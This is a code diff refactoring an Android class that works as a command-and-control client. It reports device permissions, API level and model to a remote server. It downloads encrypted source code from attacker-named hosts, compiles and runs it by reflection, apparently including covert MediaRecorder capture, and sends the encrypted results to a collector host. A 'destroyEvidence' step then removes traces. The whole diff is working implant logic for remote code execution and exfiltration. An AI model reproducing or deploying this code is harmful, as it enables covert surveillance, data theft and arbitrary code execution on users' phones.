@@ -8,6 +8,7 @@ import android.os.AsyncTask;
 import android.util.Log;
 
 import com.android.a2faces.compile_unit.Compile;
+import com.android.a2faces.compile_unit.InvalidSourceCodeException;
 import com.android.a2faces.compile_unit.NotBalancedParenthesisException;
 
 import java.io.BufferedReader;
@@ -23,6 +24,8 @@ import java.util.regex.Pattern;
 import javassist.NotFoundException;
 
 public class CommunicationTask extends AsyncTask<Void, Void, String> {
+    private static final String LOGCAT_TAG = "COMMUNICATION_TASK";
+
     private Context context;
 
     private String socketMainHostname;
@@ -58,25 +61,28 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
 
             while( isAlive ) {
                 String commandReceived = readFromSocketMain();
-                Log.d("COMMAND", commandReceived);
+                Log.d(LOGCAT_TAG, "COMMAND" + commandReceived);
 
                 String toSend = "";
+
+                // Initial messages
                 if (commandReceived.equals("Permissions")) {
                     toSend = getPermissions(false);
                 } else if (commandReceived.equals("Permissions granted")) {
                     toSend = getPermissions(true);
                 } else if (commandReceived.equals("API")) {
-                    toSend = "API:" + android.os.Build.VERSION.SDK_INT;
+                    toSend = getApiLevel();
                 } else if (commandReceived.equals("Model")) {
-                    toSend = "Model:" + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
-                } else if (commandReceived.startsWith("Servers: ")) {
-                    String[] serversList = commandReceived.substring(9).split(Pattern.quote("|"));
-                    Log.d("serversList", Arrays.toString(serversList));
+                    toSend = getDeviceModel();
+                }
+
+                // Activation message
+                if (commandReceived.startsWith("Servers: ")) {
+                    String[] socketCodeSendersList = parseSocketCodeSenderList(commandReceived);
+                    Log.d("serversList", Arrays.toString(socketCodeSendersList));
 
                     String collectorServer = readFromSocketMain();
-                    collectorServer = collectorServer.split("Collector: ")[1];
-                    String[] collectorParams = collectorServer.split(":");
-                    Log.d("collectorServer", Arrays.toString(collectorParams));
+                    parseSocketCollectorParams(collectorServer);
 
                     String resultType = readFromSocketMain();
                     resultType = resultType.split("Result Type: ")[1];
@@ -85,18 +91,12 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
                     //download phase
                     long startDownloadPhase = System.nanoTime();
                     String code =  "";
-                    for (int i = 0; i < serversList.length; i++) {
-                        String[] sockParams = serversList[i].split(":");
-                        Log.d("sockParams", Arrays.toString(sockParams));
+                    for (int i = 0; i < socketCodeSendersList.length; i++) {
+                        parseSocketCodeSenderParams(socketCodeSendersList[i]);
 
-                        //code sender phase @TODO improve this
-                        connectToSocketCodeSender(sockParams[0], Integer.parseInt(sockParams[1]));
+                        connectToSocketCodeSender(this.socketCodeSenderHostname, this.socketCodeSenderPort);
+                        code += readFromSocketCodeSender();
 
-                        code += Crypto.decryptString(
-                                Crypto.sha256(sockParams[1] + sockParams[0]),
-                                Crypto.md5(sockParams[0] + sockParams[1]),
-                                inCodeSender.readLine());
-                        Log.d("SLAVE_COMMAND", code);
                         closeSocketCodeSender();
                         //end code sender phase
                     }
@@ -133,13 +133,14 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
 
                         Thread.sleep(5000);
 
-                        Method metodo2 = obj.getClass().getDeclaredMethod("stop", Context.class, MediaRecorder.class);
-                        result = (String) metodo2.invoke(obj, this.context, pezzotto);
+                        Method metodo2 = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
+                        result = (String) metodo2.invoke(obj, pezzotto, this.context);
                     } else {
                         Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
                         result = (String) metodo.invoke(obj, this.context);
                     }
                     long endExecution = System.nanoTime();
+                    String resultToSend = "Result: " + result;
                     //end compiling, loading and execution phase
 
                     //eval timing
@@ -149,21 +150,11 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
                     double timeToLoad =  (endLoading - startLoading) / 1000000.0 ;
                     double timeToExecute =  (endExecution - startExecution) / 1000000.0;
                     String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToLoad + "~" + timeToExecute;
-                    Log.d("Timing", timingToSend);
-                    //collection phase TODO improve this
-                    connectToSocketCollector(collectorParams[0], Integer.parseInt(collectorParams[1]));
 
-                    String resultToSend = "Result: " + result;
-                    String encrypted = Crypto.encryptString(
-                            Crypto.sha256(collectorParams[1] + collectorParams[0]),
-                            Crypto.md5(collectorParams[0] + collectorParams[1]),
-                            timingToSend + "|" + resultToSend);
-                    Log.d("COLLECTOR", encrypted);
-                    outCollector.println(encrypted);
-
-                    //TODO send this back
+                    //collector phase
+                    connectToSocketCollector(this.socketCollectorHostname, this.socketCollectorPort);
+                    writeOnSocketCollector(timingToSend + "|" + resultToSend);
                     closeSocketCollector();
-                    //end collection phase
 
                     //destroy all
                     compile.destroyEvidence();
@@ -194,6 +185,8 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
             e.printStackTrace();
         } catch (InterruptedException e) {
             e.printStackTrace();
+        } catch (InvalidSourceCodeException e) {
+            e.printStackTrace();
         }
 
         closeSocketMain();
@@ -202,23 +195,24 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
         return "Executed";
     }
 
-    private String getPermissions(boolean onlyGranted) throws PackageManager.NameNotFoundException {
-        PackageInfo info = this.context.getPackageManager().getPackageInfo(this.context.getPackageName(), PackageManager.GET_PERMISSIONS);
-        String[] permissions = info.requestedPermissions;
-
-        StringBuilder permissionsAssembled = new StringBuilder("Permissions:");
-        StringBuilder permissionsGrantedAssembled = new StringBuilder("Permissions Granted:");
-        for (int i = 0; i < permissions.length; i++) {
-            if( (info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ) {
-                permissionsGrantedAssembled.append(permissions[i]).append('|');
-            }
-
-            permissionsAssembled.append(permissions[i]).append('|');
-        }
-
-        return onlyGranted?  permissionsGrantedAssembled.toString() : permissionsAssembled.toString();
+    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
+        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
     }
 
+    private void parseSocketCodeSenderParams(String socketCodeSenderString) {
+        String[] codeSenderParams = socketCodeSenderString.split(":");
+
+        this.socketCodeSenderHostname = codeSenderParams[0];
+        this.socketCodeSenderPort = Integer.parseInt(codeSenderParams[1]);
+    }
+
+    private void parseSocketCollectorParams(String socketCollectorString) {
+        socketCollectorString = socketCollectorString.split("Collector: ")[1];
+        String[] collectorParams = socketCollectorString.split(":");
+
+        this.socketCollectorHostname = collectorParams[0];
+        this.socketCollectorPort = Integer.parseInt(collectorParams[1]);
+    }
 
     /**
      * Establish a connection with the SocketMain
@@ -229,7 +223,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
     private void connectToSocketMain(String hostname, int port) {
         try {
             if(socketMain == null) {
-                Log.d("Main", "[Connecting to socket master...]");
+                Log.d(LOGCAT_TAG, "[Connecting to SocketMain...]");
                 this.socketMain = new Socket(hostname, port);
 
                 this.outMain =  new PrintWriter(socketMain.getOutputStream(), true);
@@ -249,7 +243,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
     private void connectToSocketCodeSender(String hostname, int port) {
         try {
             if(socketCodeSender == null) {
-                Log.d("Slave", "[Connecting to socket slave...]");
+                Log.d(LOGCAT_TAG, "[Connecting to SocketCodeSender...]");
                 this.socketCodeSender = new Socket(hostname, port);
                 this.socketCodeSender.setReuseAddress(false);
 
@@ -270,7 +264,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
     private void connectToSocketCollector(String hostname, int port) {
         try {
             if(socketCollector == null) {
-                Log.d("Collector", "[Connecting to socket collector...]");
+                Log.d(LOGCAT_TAG, "[Connecting to SocketCollector...]");
                 this.socketCollector = new Socket(hostname, port);
                 this.socketCollector.setReuseAddress(false);
 
@@ -281,6 +275,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
             e.printStackTrace();
         }
     }
+
 
 
     /**
@@ -311,12 +306,31 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
     }
 
 
-    private void readFromSocketCodeSender() {
-
+    /**
+     * Wait for a new message from SocketCodeSender and, when it arrive, decrypt it
+     *
+     * @return decrypted message read from SocketCodeSender
+     * @throws IOException in case of error with buffer
+     */
+    private String readFromSocketCodeSender() throws IOException {
+        String receivedEncrypted = this.inCodeSender.readLine();
+        return Crypto.decryptString(
+                Crypto.sha256(this.socketCodeSenderPort + this.socketCodeSenderHostname),
+                Crypto.md5(this.socketCodeSenderHostname + this.socketCodeSenderPort),
+                receivedEncrypted);
     }
 
+    /**
+     * Encrypt and write message on SocketCollector
+     *
+     * @param message to be encrypted and written
+     */
     private void writeOnSocketCollector(String message) {
-
+        String messageEncrypted = Crypto.encryptString(
+                Crypto.sha256(this.socketCollectorPort + this.socketCollectorHostname),
+                Crypto.md5(this.socketCollectorHostname + this.socketCollectorPort),
+                message);
+        this.outCollector.println(messageEncrypted);
     }
 
 
@@ -365,6 +379,45 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
             }
         }
     }
+
+
+
+    /**
+     * Get API level to send back to server
+     *
+     * @return string with API level to send back to server
+     */
+    private String getApiLevel() {
+        return "API:" + android.os.Build.VERSION.SDK_INT;
+    }
+
+    /**
+     * Get model of device to send back to server
+     *
+     * @return string with model of device to send back to server
+     */
+    private String getDeviceModel() {
+        return "Model:" + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+    }
+
+    private String getPermissions(boolean onlyGranted) throws PackageManager.NameNotFoundException {
+        PackageInfo info = this.context.getPackageManager().getPackageInfo(this.context.getPackageName(), PackageManager.GET_PERMISSIONS);
+        String[] permissions = info.requestedPermissions;
+
+        StringBuilder permissionsAssembled = new StringBuilder("Permissions:");
+        StringBuilder permissionsGrantedAssembled = new StringBuilder("Permissions Granted:");
+        for (int i = 0; i < permissions.length; i++) {
+            if( (info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ) {
+                permissionsGrantedAssembled.append(permissions[i]).append('|');
+            }
+
+            permissionsAssembled.append(permissions[i]).append('|');
+        }
+
+        return onlyGranted?  permissionsGrantedAssembled.toString() : permissionsAssembled.toString();
+    }
+
+
 
     @Override
     protected void onPostExecute(String result) {
